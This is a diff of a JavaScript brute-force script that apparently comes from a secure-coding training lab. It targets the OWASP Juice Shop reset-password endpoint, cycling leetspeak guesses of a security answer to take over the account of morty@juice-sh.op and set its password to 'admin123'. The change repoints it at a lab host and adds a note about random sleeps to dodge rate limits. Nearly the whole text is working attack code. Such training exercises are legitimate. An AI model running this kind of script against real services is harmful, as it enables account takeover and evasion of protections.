@@ -1,10 +1,19 @@
 // Einfügen erlauben
 
+var host = 'https://f1fe71a1.labs.secure-coding-schulung.de';
+
 var passwordList = [
     "snuffles",
     "snowball",
+    "5n0wb4ll",
+    "5n0w8all",
+    "5N0W8411",
+    "5n0w8411",
     /* ... */
-    "snowball",
+    "5n0wb4ll",
+    "5n0wb4ll",
+    "5n0wb4ll",
+    "5n0wb4ll",
     "5n0wb4ll",
     "5N0wb41L" ];
 
@@ -15,12 +24,12 @@ for (var i = 0; i < passwordList.length; i++) {
     var bruteforcePassword = passwordList[i];
     var postBody = {    "answer" : bruteforcePassword,
                         "email" :  "morty@juice-sh.op",
-                        "new" :	   "asd123",
-                        "repeat" : "asd123"
+                        "new" :	   "admin123",
+                        "repeat" : "admin123"
                    };
 
     $.ajax({
-        url: 'https://192.168.99.100:32768/rest/user/reset-password',
+        url: host + '/rest/user/reset-password',
         type: 'post',
         dataType: 'json',
         contentType: 'application/json',
@@ -39,6 +48,7 @@ for (var i = 0; i < passwordList.length; i++) {
         },
         error: function (data) {
             console.info("Wrong password", data);
+            //TODO: implement random sleep
         },
     });
 
